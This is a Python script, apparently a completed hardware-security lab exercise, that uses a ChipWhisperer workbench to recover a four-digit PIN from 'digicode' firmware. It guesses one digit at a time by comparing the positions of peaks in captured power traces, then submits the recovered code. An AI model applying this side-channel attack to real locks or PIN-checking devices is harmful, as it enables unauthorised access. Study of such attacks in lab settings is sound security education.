#! /usr/bin/env python3

import code
import chipwhisperer as cw
import numpy as np
import matplotlib.pyplot as plt
import time
import os
import sys
from server import Device
from server import WorkBench

local_config = dict()
wb = WorkBench(local_config.get('workbench', dict()),0)

wb.upload_firmware('secret-digicode-2.hex') # Modify if you want to target another implementation

wb.reset()

digit_0_guessed = 0
digit_1_guessed = 0
digit_2_guessed = 0
digit_3_guessed = 0

tolerance = 0

code_tested = str(0) + str(0) + str(0) + str(0)
wb.write('c')
wb.arm()
wb.write(code_tested)
wb.capture()
wb.read(50)
trace = wb.get_last_trace()
peak_index = np.argmax(trace[0:150]) # Select bounds

for digit_tested in range(10):
    code_tested = str(digit_tested) + str(0) + str(0) + str(0)# Choose a code to test
    print(f"testing0: {code_tested}")
    wb.write('c')
    wb.arm()
    wb.write(code_tested)
    wb.capture()
    wb.read(50)
    trace = wb.get_last_trace()
    # Write the code for digit verification below
    peak_index_test = np.argmax(trace[0:150])
    if peak_index_test > peak_index + tolerance: 
        digit_0_guessed = digit_tested
        break

    


code_tested = str(digit_0_guessed) + str(0) + str(0) + str(0)
wb.write('c')
wb.arm()
wb.write(code_tested)
wb.capture()
wb.read(50)
trace = wb.get_last_trace()
peak_index = np.argmax(trace[0:150]) # Select bounds

for digit_tested in range(10):
    code_tested = str(digit_0_guessed) + str(digit_tested) + str(0) + str(0)# Choose a code to test
    print(f"testing1: {code_tested}")
    wb.write('c')
    wb.arm()
    wb.write(code_tested)
    wb.capture()
    wb.read(50)
    trace = wb.get_last_trace()
    # Write the code for digit verification below
    peak_index_test = np.argmax(trace[0:150])
    if peak_index_test > peak_index + tolerance: 
        digit_1_guessed = digit_tested
        break
    

code_tested = str(digit_0_guessed) + str(digit_1_guessed) + str(0) + str(0)
wb.write('c')
wb.arm()
wb.write(code_tested)
wb.capture()
wb.read(50)
trace = wb.get_last_trace()
peak_index = np.argmax(trace[0:150]) # Select bounds

for digit_tested in range(10):
    code_tested = str(digit_0_guessed) + str(digit_1_guessed) + str(digit_tested) + str(0)
    print(f"testing2: {code_tested}")
    wb.write('c')
    wb.arm()
    wb.write(code_tested)
    wb.capture()
    wb.read(50)
    trace = wb.get_last_trace()
    peak_index_test = np.argmax(trace[0:150])
    if peak_index_test > peak_index + tolerance: 
        digit_2_guessed = digit_tested
        break
    

    

code_tested = str(digit_0_guessed) + str(digit_1_guessed) + str(digit_2_guessed) + str(0)
wb.write('c')
wb.arm()
wb.write(code_tested)
wb.capture()
wb.read(50)
trace = wb.get_last_trace()
peak_index = np.argmax(trace[0:150]) # Select bounds

for digit_tested in range(10):
    code_tested = str(digit_0_guessed) + str(digit_1_guessed) + str(digit_2_guessed) + str(digit_tested)
    print(f"testing3: {code_tested}")
    wb.write('c')
    wb.arm()
    wb.write(code_tested)
    wb.capture()
    wb.read(50)
    trace = wb.get_last_trace()
    peak_index_test = np.argmax(trace[0:150])
    if peak_index_test > peak_index + tolerance: 
        digit_3_guessed = digit_tested
        break
# final test

code_guessed = str(digit_0_guessed) + str(digit_1_guessed) + str(digit_2_guessed) + str(digit_3_guessed)

print('Code found: ' + code_guessed)
print('Test')

wb.write('c')
wb.write(code_guessed)
print(wb.read(50))
